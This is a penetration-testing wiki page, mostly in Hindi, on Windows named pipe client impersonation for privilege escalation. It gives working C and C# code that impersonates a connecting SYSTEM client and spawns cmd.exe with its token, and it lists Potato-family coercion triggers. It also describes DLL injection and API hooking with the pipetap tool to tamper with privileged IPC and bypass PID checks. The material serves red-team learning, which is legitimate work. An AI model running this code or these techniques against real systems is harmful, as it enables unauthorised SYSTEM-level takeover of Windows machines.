# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation एक local privilege escalation primitive है जो एक named-pipe server thread को उस client के security context को अपना लेने देता है जो उससे connect होता है। व्यवहार में, एक attacker जो SeImpersonatePrivilege के साथ code चला सकता है, एक privileged client (उदा., एक SYSTEM service) को attacker-controlled pipe से connect करने के लिए मजबूर कर सकता है, ImpersonateNamedPipeClient कॉल कर सकता है, resulting token को primary token में duplicate कर सकता है, और client के रूप में एक process spawn कर सकता है (अक्सर NT AUTHORITY\SYSTEM)।

This page focuses on the core technique. For end-to-end exploit chains that coerce SYSTEM to your pipe, see the Potato family pages referenced below.

## TL;DR
- Create a named pipe: \\.\pipe\<random> और connection के लिए प्रतीक्षा करें।
- एक privileged component को इससे connect कराएँ (spooler/DCOM/EFSRPC/etc.)।
- pipe से कम से कम एक message पढ़ें, फिर ImpersonateNamedPipeClient कॉल करें।
- current thread से impersonation token खोलें, DuplicateTokenEx(TokenPrimary) करें, और CreateProcessWithTokenW/CreateProcessAsUser का उपयोग करके SYSTEM process प्राप्त करें।

## Requirements and key APIs
- आम तौर पर calling process/thread को जिन privileges की आवश्यकता होती है:
- SeImpersonatePrivilege — connecting client को सफलतापूर्वक impersonate करने और CreateProcessWithTokenW का उपयोग करने के लिए।
- वैकल्पिक रूप से, SYSTEM को impersonate करने के बाद आप CreateProcessAsUser का उपयोग कर सकते हैं, जिसके लिए SeAssignPrimaryTokenPrivilege और SeIncreaseQuotaPrivilege की आवश्यकता हो सकती है (ये आवश्यकताएँ तब संतुष्ट होती हैं जब आप SYSTEM को impersonate कर रहे होते हैं)।
- उपयोग किए जाने वाले core APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation से पहले कम से कम एक message पढ़ना आवश्यक)
- ImpersonateNamedPipeClient और RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW या CreateProcessAsUser
- Impersonation level: स्थानीय उपयोगी कार्य करने के लिए, client को SecurityImpersonation की अनुमति देनी चाहिए (कई local RPC/named-pipe clients के लिए default)। Clients इसे pipe खोलते समय SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION के साथ कम कर सकते हैं।

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
नोट:
- यदि ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) लौटाता है, तो सुनिश्चित करें कि आपने पहले पाइप से पढ़ा है और क्लाइंट ने impersonation को Identification level तक सीमित नहीं किया है।
- प्राथमिक टोकन बनाने के लिए, जो process creation के लिए उपयुक्त हो, DuplicateTokenEx को SecurityImpersonation और TokenPrimary के साथ प्राथमिकता दें।

## .NET त्वरित उदाहरण
.NET में, NamedPipeServerStream RunAsClient के माध्यम से impersonate कर सकता है। एक बार impersonate करने के बाद, थ्रेड टोकन को duplicate करें और एक process बनाएं।
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
ये तकनीकें privileged services को आपके named pipe से connect करने के लिए मजबूर करती हैं ताकि आप उन्हें impersonate कर सकें:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe hardened services को अभी भी trusted client को instrument करके hijack किया जा सकता है। Tools like [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) client में एक helper DLL drop करते हैं, उसके ट्रैफिक को proxy करते हैं, और SYSTEM service के उसे consume करने से पहले privileged IPC के साथ tamper करने देते हैं।

### Inline API hooking inside trusted processes
- किसी भी client में helper DLL inject करें (OpenProcess → CreateRemoteThread → LoadLibrary)।
- DLL `ReadFile`, `WriteFile`, आदि को Detours करता है, लेकिन केवल जब `GetFileType` `FILE_TYPE_PIPE` रिपोर्ट करता है; प्रत्येक buffer/metadata को एक control pipe में copy करता है, आपको इसे edit/drop/replay करने देता है, और फिर original API को resume करता है।
- वैध client को एक Burp-style proxy में बदल देता है: UTF-8/UTF-16/raw payloads को pause करें, error paths trigger करें, sequences replay करें, या JSON traces export करें।

### Remote client mode to defeat PID-based validation
- एक allow-listed client में inject करें, फिर GUI में उस pipe और उस PID को चुनें।
- DLL trusted process के अंदर `CreateFile`/`ConnectNamedPipe` जारी करता है और I/O को आपके पास relay करता है, जिससे server अभी भी वैध PID/image देखता है।
- यह उन filters को bypass करता है जो `GetNamedPipeClientProcessId` या signed-image checks पर निर्भर करते हैं।

### Fast enumeration and fuzzing
- `pipelist` `\\.\pipe\*` को enumerate करता है, ACLs/SIDs दिखाता है, और immediate probing के लिए entries को अन्य modules को forward कर देता है।
- pipe client/message composer किसी भी name से connect करता है और UTF-8/UTF-16/raw-hex payloads बनाता है; captured blobs import करें, fields mutate करें, और deserializers या unauthenticated command verbs को खोजने के लिए पुनः भेजें।
- helper DLL एक loopback TCP listener host कर सकता है ताकि tooling/fuzzers Python SDK के जरिए remotely pipe को drive कर सकें।
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
TCP bridge को VM snapshot restores के साथ मिलाकर नाज़ुक IPC parsers का crash-test करें।

### Operational considerations
- Named pipes कम-लेटेंसी होते हैं; buffers संपादित करते समय लंबे विराम नाज़ुक सेवाओं को deadlock कर सकते हैं।
- Overlapped/completion-port I/O कवरेज आंशिक है, इसलिए edge cases की उम्मीद रखें।
- Injection noisy और unsigned होता है, इसलिए इसे stealth implant के बजाय lab/exploit-dev helper के रूप में मानें।

## Troubleshooting and gotchas
- आपको ImpersonateNamedPipeClient कॉल करने से पहले pipe से कम-से-कम एक संदेश पढ़ना चाहिए; अन्यथा आपको ERROR_CANNOT_IMPERSONATE (1368) मिलेगा।
- यदि client SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION के साथ कनेक्ट करता है, तो server पूरी तरह impersonate नहीं कर सकता; token के impersonation level की जांच GetTokenInformation(TokenImpersonationLevel) के माध्यम से करें।
- CreateProcessWithTokenW को caller पर SeImpersonatePrivilege की आवश्यकता होती है. यदि यह ERROR_PRIVILEGE_NOT_HELD (1314) के साथ विफल होता है, तो पहले SYSTEM का impersonation कर लेने के बाद CreateProcessAsUser का उपयोग करें।
- अगर आपने pipe को harden किया है तो सुनिश्चित करें कि उसके security descriptor में target service के कनेक्ट करने की अनुमति हो; डिफ़ॉल्ट रूप से, \\.\pipe के अंतर्गत pipes server के DACL के अनुसार एक्सेसिबल होते हैं।

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
